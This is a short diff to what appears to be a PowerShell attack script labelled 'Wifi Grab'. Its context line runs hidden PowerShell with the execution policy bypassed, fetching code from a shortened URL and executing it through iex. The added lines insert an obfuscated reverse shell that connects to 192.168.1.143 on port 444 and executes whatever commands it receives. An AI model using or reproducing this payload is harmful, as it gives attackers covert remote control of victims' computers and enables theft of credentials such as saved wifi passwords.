@@ -3,7 +3,8 @@ Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
 
 $script = @'
 
-  
+`$T=`"N`"`w-`"O`bje`c`"t N`e`"t.Sock`ets.TCP`C`lie`n`"t(`"1`92.1`68.1.`1`4`3`",4`44);`$N=`$T.G`etStr`e`am();`$S=`"N`"ew-O`bje`"ct I`O.S`tr`eamW`r`iter(`$N);f`u`ncti`o`n W`r`iteT`oS`tr`e`am(`$S`tr) {[by`te[]]`$B`u`ff`e`r=0..`$T.R`eceive`B`u`ff`e`rS`i`ze |% {0};`$S.W`ri`te(`$S`tr+`'SHE`L`L> `');`$S.F`l`ush()}W`r`iteToS`tr`ea`m `'';wh`ile((`$B=`$N.`R`ea`d(`$B`u`ff`e`r,0,`$B`u`f`fer.`L`en`gth))-`gt`0){`$C=([t`e`x`t.`e`ncoding]::U`T`F8).GetS`tri`ng(`$B,0,`$B-1);`$O=tr`y{Inv`ok`e-Expr`ession `$C 2>&1|O`u`t-Str`i`ng}c`a`tc`h{`$_|Out-String}WriteT`oStre`a`m(`$O)}W`r`ite`r.Close()
+
 '@
 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
